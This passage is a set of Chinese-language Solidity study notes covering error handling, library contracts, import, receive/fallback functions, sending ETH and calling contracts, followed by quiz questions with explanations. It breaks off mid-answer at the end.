plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(检查条件，“异常的描述”)</span><br></pre></td></tr></table></figure><p>​当检查条件不成立的时候，就会抛出异常</p><h4 id="3-Assert"><a href="#3-Assert" class="headerlink" title="3. Assert"></a>3. Assert</h4><p>比require少个字符串，即不能抛出异常的原因</p><p>assert命令一般用于程序员写程序debug，它的用法很简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(检查条件）</span><br></pre></td></tr></table></figure><p>当检查条件不成立的时候，就会抛出异常。</p><h4 id="三种方法的gas比较"><a href="#三种方法的gas比较" class="headerlink" title="三种方法的gas比较"></a>三种方法的gas比较</h4><p><span style = "color: blue;">error方法gas最少，其次是assert，require方法消耗gas最多</span></p><p>因此，error既可以告知用户抛出异常的原因，又能省gas要多用！</p><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>实参匹配：调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。</p><p> 如果出现多个匹配的重载函数，则会报错</p><p><strong>overloading</strong>:即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。</p><p><strong>solidity不允许修饰器（modifier）重载</strong></p><h3 id="库合约"><a href="#库合约" class="headerlink" title="库合约"></a>库合约</h3><p>​库合约是一系列的函数合集，用于提升solidity代码的复用性和减少gas而存在</p><p>​他和普通合约主要有以下几点不同：</p><ol><li>不能存在状态变量</li><li>不能够继承或被继承</li><li>不能接收以太币</li><li>不可以被销毁</li></ol><p>​库合约中的函数可见性如果被设置为public或者external，则在调用函数时会触发一次delegatecall。而如果被设置为internal，则不会引起。对于设置为private可见性的函数来说，其仅能在库合约中可见，在其他合约中不可用。</p><p><strong>delegatecall</strong>: </p><p><code>delegatecall</code> 是一种特殊的低级函数调用，用于将当前合约的上下文（包括<code>msg.sender</code>和<code>msg.value</code>等）传递给另一个合约的函数执行。<code>delegatecall</code> 允许合约在不改变调用者上下文的情况下执行另一个合约的代码。</p><p><strong><code>delegatecall</code> 的作用</strong></p><ul><li><strong>共享存储</strong>：<code>delegatecall</code> 是调用另一个合约的代码，并在调用者合约的存储上下文中执行。这意味着被调用合约的代码会对调用合约的存储变量进行读写。</li><li><strong>保持调用者上下文</strong>：<code>msg.sender</code> 和 <code>msg.value</code> 等上下文信息保持不变，依旧指向调用者，这和普通的合约调用不同。</li><li><strong>代码重用</strong>：使用 <code>delegatecall</code> 可以使多个合约共享同一段逻辑代码，通过代理模式实现合约的代码复用。</li></ul><h4 id="Strings库合约"><a href="#Strings库合约" class="headerlink" title="Strings库合约"></a><strong>Strings库合约</strong></h4><p>Strings库合约是将uint256类型转换为相应的string类型的代码库</p><p><strong>如何利用</strong>：</p><p>​用using for 指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using A for B</span><br></pre></td></tr></table></figure><p>​用于附加库合约（从库A）到任何类型（B)。添加完指令后，库A中的函数会自动添加为B类型变量的成员，可以直接调用。</p><p>注意： 在调用的时候，这个变量会被当作第一个参数传递给函数</p><p><strong>直接通过库合约名称调用函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//利用using for指令</span><br><span class="line"></span><br><span class="line">using String for uint256;</span><br><span class="line">function getString1(uint256_number)public pure returns(string memory)&#123;</span><br><span class="line"></span><br><span class="line">//库合约中的函数会自动添加为uint256型变量的成员</span><br><span class="line"></span><br><span class="line">return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>常用库合约</strong>：</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Strings.sol">Strings</a>：将<code>**uint256**</code>转换为<code>**String**</code></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Address.sol">Address</a>：判断某个地址是否为合约地址</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Create2.sol">Create2</a>：更安全的使用<code>**Create2 EVM opcode**</code></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Arrays.sol">Arrays</a>：跟数组相关的库合约</p><h3 id="引用Import"><a href="#引用Import" class="headerlink" title="引用Import"></a>引用Import</h3><p>​引用（import）在代码中的<strong>位置为： 在声明版本号之后，在其余代码之前</strong></p><p>​import语句可以帮助我们在一个文件中引用另一个文件的内容</p><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><ol><li>通过源文件相对位置导入</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//通过文件相对位置import</span><br><span class="line">import &#x27;./name.sol&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>通过源文件网址导入网上的合约的全局符号</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//通过网址引用</span><br><span class="line">import&#x27;url&#x27;</span><br></pre></td></tr></table></figure><ol start="3"><li><p>通过npm的目录导入</p></li><li><p>通过指定全局符号导入合约特定的全局符号</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123;name&#125; from&#x27;./name.sol&#x27;</span><br></pre></td></tr></table></figure><p>​其中的 <code>name</code> 就是一个 <em>全局符号</em>。它可以是一个具体的合约、库、结构体、枚举或函数的名称。通过 <code>import</code> 语句，可以从指定的文件（例如 <code>name.sol</code>）中导入该符号，以便在当前文件中直接使用。</p><h3 id="回调函数receive-fallback"><a href="#回调函数receive-fallback" class="headerlink" title="回调函数receive&amp;fallback"></a>回调函数receive&amp;fallback</h3><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><pre><code>1. 接受ETH1. 处理合约中不存在的函数调用（代理合约proxy contract）</code></pre><p>（所以：fallback 和 receive 函数<strong>无法在合约内部直接调用</strong>。这些特殊函数只能通过外部调用触发，通常在接收以太币或处理未知的函数调用时<strong>自动执行</strong></p><h4 id="接收ETH函数receive"><a href="#接收ETH函数receive" class="headerlink" title="接收ETH函数receive"></a>接收ETH函数receive</h4><p>a. 在合约收到ETH转账时被调用</p><p>b. 一个合约最多有一个receive()函数</p><p>c. 声明方式: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123; ... &#125; [不需要function关键字]</span><br></pre></td></tr></table></figure><p>d.  receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable</p><p>receive()最好不要执行太多的逻辑，receive()太复杂可能会触发Out of Gas报错</p><h4 id="回退函数fallback"><a href="#回退函数fallback" class="headerlink" title="回退函数fallback"></a>回退函数fallback</h4><p>a.   在调用合约不存在的函数时被触发</p><p>b.   可用于接收ETH，也可以用于代理合约proxy contract</p><p>c.   声明时不需要function关键字，必须由external修饰，一般也会用payable修饰</p><p>Eg: 用于接收ETH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fallback() external payable &#123; ... &#125;</span><br></pre></td></tr></table></figure><h4 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h4><ol><li><p>合约接收ETH时，msg.data为空且存在Receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable</p></li><li><p>receive()和payable fallback()均不存在的时候，向合约直接发送ETH将会报错</p><p>（你仍可以通过带有payable的函数向合约发送ETH）</p></li></ol><p><img src="https://s2.loli.net/2024/11/18/9GL52VTyYbe8xsH.png" alt="1.png"></p><p>​在这个场景中，vitalik 向合约 ReceiveETH 发起了一笔带有 msg.data（0xaa）的低级交互，同时设置了 value 为 100 Wei。让我们分析代码：</p><ul><li>合约 ReceiveETH 中定义了一个 receive() 函数，该函数是 external 和 payable 的，但 receive() 函数只能在没有 msg.data 的情况下被调用。</li><li>由于 msg.data 不为空（0xaa），这次调用不会触发 receive() 函数。</li><li>合约也没有定义 fallback 函数，所以任何带有 msg.data 且没有匹配函数签名的调用将会导致交易失败。</li></ul><p><strong>结论</strong></p><p>这次调用将失败，并抛出错误，因为合约没有 fallback 函数来处理包含 msg.data 的调用。</p><p>所以会出现报错：error:’Fallback’ function is not defined, value和msg.data均发送失败</p><h3 id="发送ETH"><a href="#发送ETH" class="headerlink" title="发送ETH"></a>发送ETH</h3><ol><li><p><strong>transfer()</strong></p></li><li><p><strong>send()</strong></p></li><li><p><strong>call()，其中call()是被鼓励的用法。</strong></p></li></ol><p>首先构造发送ETH合约SendETH，并在其中实现payable的构造函数和receive()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract SendETH&#123;</span><br><span class="line"></span><br><span class="line">//构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    //receive方法 接受eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-transfer"><a href="#1-transfer" class="headerlink" title="1. transfer"></a>1. transfer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接收方地址.transfer(发送eth的数额)</span><br></pre></td></tr></table></figure><p>·    <strong>transfer()<strong>的</strong>gas</strong>限制是<strong>2300</strong>，足够用于转账，但对方合约的**fallback()<strong>或</strong>receive()**函数不能实现太复杂的逻辑。</p><p>·    <strong>transfer()<strong>如果转账失败（eg: amount&gt;value），会自动</strong>revert</strong>（回滚交易）。</p><p> amount：通常表示用户或合约希望发送的 ETH 的数量。这里 amount 是一个变量，表示转账时指定的具体金额（单位为 wei）。</p><p>value：指交易中随附的 ETH 数量，通常由 msg.value 表示。这是调用合约时由发送方附加的 ETH 数量，通常用于支付给其他地址或完成购买。value 只能在 payable 函数中被使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//用transfer()发送ETH,_to填reveive合约地址，amount填ETH转账金额</span><br><span class="line">function transferETH(address payable _to,uint256 amount) external payable&#123;</span><br><span class="line">_to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-send"><a href="#2-send" class="headerlink" title="2. send"></a>2. send</h4><p><strong>用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接收方地址.send(发送ETH数额)</span><br></pre></td></tr></table></figure><p>·    <strong>send()<strong>的</strong>gas</strong>限制是<strong>2300</strong>，足够用于转账，但对方合约的**fallback()<strong>或</strong>receive()**函数不能实现太复杂的逻辑。</p><p>·    <strong>send()<strong>如果转账失败，不会</strong>revert</strong>。</p><p>·    <strong>send()<strong>的返回值是</strong>bool</strong>，代表着转账成功或失败，需要额外代码处理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error SendFailed(); // 用send发送ETH失败error</span><br><span class="line">// send()发送ETH</span><br><span class="line">function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">    bool success = _to.send(amount);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert SendFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-Call"><a href="#3-Call" class="headerlink" title="3.Call"></a><strong>3.Call</strong></h4><p><strong>用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)</span><br></pre></td></tr></table></figure><p>·    <strong>call()<strong>没有</strong>gas</strong>限制，可以支持对方合约**fallback()<strong>或</strong>receive()**函数实现复杂逻辑。</p><p>·    <strong>call()<strong>如果转账失败，不会</strong>revert</strong>。</p><p>·    <strong>call()<strong>的返回值是</strong>(bool, bytes)<strong>，其中</strong>bool</strong>代表着转账成功或失败，需要额外代码处理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">error CallFAiled()// 用call发送ETH失败error</span><br><span class="line"></span><br><span class="line">// call()发送ETH</span><br><span class="line">function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">    (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert CallFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>·    <strong>call</strong>没有<strong>gas</strong>限制，最为灵活，是最提倡的方法；</p><p>·    <strong>transfer</strong>有<strong>2300 gas</strong>限制，但是发送失败会自动<strong>revert</strong>交易，是次优选择；</p><p>·    <strong>send</strong>有<strong>2300 gas</strong>限制，而且发送失败不会自动<strong>revert</strong>交易，几乎没有人用它。</p><h3 id="调用其他合约"><a href="#调用其他合约" class="headerlink" title="调用其他合约"></a>调用其他合约</h3><p><strong>如何调用</strong></p><p>​可以利用合约的地址和合约代码（或接口）来创建合约的引用：_Name(_Address)，其中_Name是合约名，应与合约代码（或接口）中标注的合约名保持一致，_Address是合约地址。然后用合约的引用来调用它的函数：_Name(_Address).f()，其中f()是要调用的函数。</p><h4 id="1-传入合约地址"><a href="#1-传入合约地址" class="headerlink" title="1.传入合约地址"></a>1.传入合约地址</h4><p>我们可以在函数里传入目标合约地址，生成目标合约的引用，然后调用目标函数。</p><p>以调用OtherContract合约的setX函数为例，我们在新合约中写一个callSetX函数，</p><p>传入已部署好的OtherContract合约地址_Address和setX的参数x：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callSetX(address _address,uint256 x)external&#123;</span><br><span class="line">OtherContract(_Address).setX(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制OtherContract合约的地址，填入callSetX函数的参数中，成功调用后，调用OtherContract合约中的getX验证x变为123</p><h4 id="2-传入合约变量"><a href="#2-传入合约变量" class="headerlink" title="2.传入合约变量"></a>2.传入合约变量</h4><p>我们可以直接在函数里传入合约的引用，只需要把上面参数的<strong>address类型改为目标合约名</strong></p><p>比如上述的OtherContract</p><p>(ps: 该函数参数OtherContract _Address底层类型仍然是address，生成的ABI中、调用callGetX时传入的参数都是address类型)</p><p>例子： </p><p>通过传入合约变量调用目标合约的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callGetX(OtherContract _Address) external view returns(uint x)&#123;</span><br><span class="line">x = _Address.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制OtherContract合约的地址，填入callGetX函数的参数中，调用后成功获取x的值</p><h4 id="3-创建合约变量"><a href="#3-创建合约变量" class="headerlink" title="3. 创建合约变量"></a>3. 创建合约变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function callGetX(address _Address) external view returns(uint x)&#123;</span><br><span class="line"></span><br><span class="line">//创建变量</span><br><span class="line">OtherContract oc = OtherContract(_Address);//oc为OtherContract别名</span><br><span class="line">x = oc.getX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制OtherContract合约的地址，填入callGetX2函数的参数中，调用后成功获取x的值</p><h4 id="4-调用合约并发送ETH"><a href="#4-调用合约并发送ETH" class="headerlink" title="4.调用合约并发送ETH"></a>4.调用合约并发送ETH</h4><p>如果目标合约的函数是payable的，那么我们可以通过调用它来给合约转账：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_Name(_Address).f&#123;value: _Value&#125;()</span><br></pre></td></tr></table></figure><p>其中**_Name<strong>是合约名，</strong>_Address<strong>是合约地址，</strong>f<strong>是目标函数名，</strong>_Value<strong>是要转的</strong>ETH<strong>数额（以</strong>wei**为单位）。</p><p><strong>OtherContract</strong>合约的<strong>setX</strong>函数是<strong>payable</strong>的，在下面这个例子中我们通过调用<strong>setX</strong>来往目标合约转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function setXTransferETH(address otherContract, uint256 x) payable external&#123;</span><br><span class="line">   OtherContract(otherContract).setX&#123;value: msg.value&#125;(x);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="利用call调用合约"><a href="#利用call调用合约" class="headerlink" title="利用call调用合约"></a>利用call调用合约</h3><p>call 是address类型的低级成员函数，它用来与其他合约交互。它的返回值为<code>(bool, bytes memory)</code>，分别对应call是否成功以及目标函数的返回值。</p><p>不推荐用call来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数</p><p>当我们不知道对方合约的源代码或ABI，就没法生成合约变量；这时，我们仍可以通过call调用对方合约的函数</p><p><strong>使用规则</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.call(字节码);</span><br></pre></td></tr></table></figure><p>（其中字节码利用结构化编码函数abi.encodeWithSignature获得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)</span><br></pre></td></tr></table></figure><p><strong>函数签名为”函数名（逗号分隔的参数类型）”</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</span><br></pre></td></tr></table></figure><p>另外<code>call</code>在调用合约时可以指定交易发送的<strong>ETH</strong>数额和<strong>gas</strong>数额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.call&#123;value:发送数额, gas:gas数额&#125;(字节码);</span><br></pre></td></tr></table></figure><p>利用Call调用合约举例</p><ol><li><strong>Response事件</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 定义Response事件，输出call返回的结果success和data,方便观察返回值</span><br><span class="line">event Response(bool success, bytes data);</span><br></pre></td></tr></table></figure><ol start="2"><li><p><strong>调用setX函数</strong></p><p>定义<strong>callSetX</strong>函数来调用目标合约的<strong>setX()<strong>，转入</strong>msg.value</strong>数额的<strong>ETH</strong>，并释放<strong>Response</strong>事件输出<strong>success</strong>和<strong>data</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function callSetX(address payable _addr,uint256 x)public payable&#123;</span><br><span class="line"></span><br><span class="line">//同时还可发送eth,_addr是目标合约的地址</span><br><span class="line">(bool success,bytes memory data) = _addr&#123;value:msg.value&#125;(</span><br><span class="line">abi.encodeWithSignature(&quot;setX(uint256)&quot;, x)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">emit Response(success,data);//释放事件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>​当我们此时调用callSetX把状态变量_x改为5，参数为OtherContract地址和5，由于目标函数setX()没有返回值，因此Response事件输出的data为0x，也就是空。</p><ol start="3"><li><p><strong>调用getX函数</strong></p><p>所以我们还需要调用getX()函数用于返回目标合约X(uint256)的值</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function callGetX(address _addr) external returns(uint256)&#123;</span><br><span class="line">(bool success, bytes memory data) = _addr.call(</span><br><span class="line">//可以利用abi.decode来解码call的返回值data，并读出数值。</span><br><span class="line">        abi.encodeWithSignature(&quot;getX()&quot;));</span><br><span class="line">        </span><br><span class="line">        emit Response(success,data);</span><br><span class="line">        return abi.decode(data, (uint256));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>Response</code>事件的输出，我们可以看到data为0x0000000000000000000000000000000000000000000000000000000000000005。而经过<code>abi.decode</code>，最终返回值为5。</p><ol start="4"><li><strong>调用不存在的函数</strong></li></ol><p>如果给<code>call</code>输入的函数不存在于目标合约，那么目标合约的<strong>fallback</strong>函数会被触发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function callNonExist(address _addr)external&#123;</span><br><span class="line"></span><br><span class="line">//call不存在的foo()函数</span><br><span class="line">(bool success, bytes memory data)=_addr.call(</span><br><span class="line">abi.encodeWithSignature(&quot;foo(uint256)&quot;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">emit Response(success,data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>call了不存在的foo函数。call仍能执行成功，并返回success，但其实调用的目标合约fallback函数</p><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><ul><li>​下列关于事件的说法中，错误的是</li></ul><p>（选择一个答案） </p><p>A. Solidity中的事件（event）是EVM上日志的抽象。</p><p>B. 事件的声明由event关键字开头，然后跟事件名称。</p><p>C. 链上存储数据比存储事件的成本低。</p><p>D. 应用程序（ether.js）可以通过RPC接口订阅和监听这些事件，并在前端做响应。</p><p><strong>解析：</strong></p><ul><li><strong>选项 A：正确。事件在 Solidity 中是 EVM 上日志的抽象，事件记录在链上日志中，但不直接参与合约逻辑。</strong></li><li><strong>选项 B：正确。事件的声明确实是通过 event 关键字定义的。</strong></li><li><strong>选项 C：错误。实际上，存储事件的成本比直接在链上存储数据要低，因为事件被存储在交易日志中，而不占用合约的存储空间，这降低了成本。</strong></li><li><strong>选项 D：正确。应用程序（如 ethers.js）可以通过 RPC 接口监听这些事件，并在前端作出相应的反应。</strong></li></ul><p>正确答案是：</p><p>C. 链上存储数据比存储事件的成本低。</p><p>​</p><ul><li>indexed关键字可以修饰任意类型的变量 选择一个答案 A. 正确 B. 错误</li></ul><p><strong>解析：</strong></p><p><strong>在 Solidity 中，indexed 关键字不能修饰任意类型的变量。最多只能对事件中的三个参数使用 indexed 修饰，并且它只适用于某些基本类型，例如 address、uint、int 和 bytes 等。复杂的结构体或数组类型无法被 indexed 修饰。</strong>所以错误。</p><ul><li>如果合约B继承了合约A，合约C要继承A和B，要怎么写？</li></ul><p> 选择一个答案</p><p> A. contract C is A, B</p><p> B. contract C is B, A</p><p> C. contract C is B</p><p><strong>父合约在子合约之前,A为正确选项</strong></p><p>合约B继承了合约A，两个合约都有pop()函数，下面选项中，正确调用父合约函数的是：</p><p> 选择一个答案 </p><p> A. A.pop();</p><p> B. super.pop();</p><p> C. 都正确</p><p><strong>解析：</strong></p><p><strong>在 Solidity 中，当子合约 B 继承了父合约 A，并且两个合约中都存在同名函数 pop() 时，可以通过以下两种方式调用父合约的 pop() 函数：</strong></p><p>·    <strong>A.pop();：直接通过父合约的名称调用父合约的 pop()。</strong></p><p>·    <strong>super.pop();：使用 super 关键字调用父合约的 pop()，特别适合在多重继承的情况下调用父类函数。</strong></p><p><strong>因此，两种方式都可以正确调用父合约的 pop() 函数,选C</strong></p><ul><li>function a() public override{} 意思是</li></ul><p>​选择一个答案 </p><p>​A. 希望子合约重写函数a()</p><p>​B. 函数a()重写了父合约中的同名函数</p><p><strong>解析：</strong></p><p><strong>在 Solidity 中，override 关键字表示该函数是对父合约中同名函数的重写。因此，function a() public override {} 的意思是 该函数 a() 重写了父合约中的同名函数。</strong></p><ul><li>合约B继承了合约A，下面选项中，正确调用父合约构造函数的是：</li></ul><p>​A. constructor(uint _num) { A(_num);} </p><p>​B. constructor(uint _num) { A.constructor(_num);}</p><p>​C. constructor(uint _num) A(_num){}</p><p><strong>解析：</strong></p><p><strong>在 Solidity 中，如果合约 B 继承了合约 A，并且需要在合约 B 的构造函数中调用合约 A 的构造函数，正确的写法是 constructor(uint _num) A(_num){}。</strong></p><ul><li>被导入文件中的全局符号想要被其他合约单独导入，应该怎么编写？</li></ul><p>（选择一个答案<strong>）</strong></p><p>​A. 将合约结构包含</p><p>​B. 包含在合约结构中</p><p>​C. 与合约并列在文件结构中</p><p><strong>解析</strong></p><p><strong>当文件中的全局符号（例如函数、结构体、枚举等）希望被其他合约单独导入时，需要将这些符号定义在合约之外，即与合约并列在文件结构中，而不是包含在特定合约的内部。</strong></p><p><strong>这样一来，这些符号就在文件的全局作用域中，便于其他文件或合约通过 import 语句直接导入和使用，选C。</strong></p><ul><li><p>Solidity中import的作用是：</p><p> A. 导入其他合约中的接口</p><p>B. 导入其他合约中的私有变量 </p><p>C. 导入其他合约中的全局符号 </p><p>D. 导入其他合约中的内部变量</p></li></ul><p><strong>解析</strong></p><p><strong>在 Solidity 中，import 关键字用于导入其他文件中定义的全局符号，如合约、库、结构体、枚举等。这使得开发者可以在当前文件中使用其他文件中的符号。</strong></p><p><strong>选项分析：</strong></p><p>·    <strong>A. 导入其他合约中的接口：虽然可以导入接口，但 import 并不限于接口。</strong></p><p><strong>·    B. 导入其他合约中的私有变量：私有变量不能在其他合约中直接访问，import 不能导入私有变量。</strong></p><p><strong>·    C. 导入其他合约中的全局符号：这是正确答案，因为 import 可以导入各种全局符号。</strong></p><p><strong>·    D. 导入其他合约中的内部变量：import 不能直接导入内部变量（internal 变量），但可以通过继承的方式访问。</strong></p><p><strong>因此，正确答案是 C。</strong></p><ul><li>以下import写法错误的是：</li></ul><p>​ A. import from “.&#x2F;Yeye.sol”;</p><pre><code> B. import &#123;Yeye&#125; from &quot;./Yeye.sol&quot;;  C. import &#123;Yeye as Wowo&#125; from &quot;./Yeye.sol&quot;;   D. import * as Wowo from &quot;./Yeye.sol&quot;;</code></pre><p><strong>解析</strong></p><p>*<em>在 Solidity 中，import 语句需要指定导入内容或者使用通配符 * 进行导入。选项 A 缺少导入的具体内容，这是错误的写法。正确的写法应当明确指定要导入的符号或使用通配符 <em>。</em></em></p><p><strong>选项分析：</strong></p><p><strong>·    A. import from “.&#x2F;Yeye.sol”;：错误。未指定导入的内容，语法不完整。</strong></p><p><strong>·    B. import {Yeye} from “.&#x2F;Yeye.sol”;：正确。导入了 Yeye 合约。</strong></p><p><strong>·    C. import {Yeye as Wowo} from “.&#x2F;Yeye.sol”;：正确。导入并将 Yeye 别名为 Wowo。</strong></p><p><strong>·    D. import * as Wowo from “.&#x2F;Yeye.sol”;：正确。导入 Yeye.sol 中所有符号，并以 Wowo 作为命名空间。</strong></p><p>  什么是命名空间？</p><p>​命名空间帮助开发者将相关的功能或数据组织在一起，使得代码逻辑更加清晰。</p><p>​通过命名空间的前缀，开发者可以快速了解某个标识符的来源和用途。</p><p><strong>因此，A 是错误的导入写法。</strong></p><ul><li><p>import导入文件中的全局符号可以单独指定其中的： </p><p> A. 合约</p><p> B. 纯函数</p><p> C. 结构体类型</p><p> D. 以上都可以</p></li></ul><p><strong>解析</strong></p><p>​ <strong>在 Solidity 中，import 语句可以单独指定要导入的符号，包括合约、函数、结构体等。例如：</strong></p><p><strong>·    合约：可以通过 import { ContractName } from “file.sol”; 来导入文件中的特定合约。</strong></p><p><strong>·    纯函数：如果文件中定义了 pure 或 view 的全局函数（从 Solidity 0.6.0 开始支持的功能），也可以通过 import { functionName } from “file.sol”; 来单独导入。</strong></p><p><strong>·    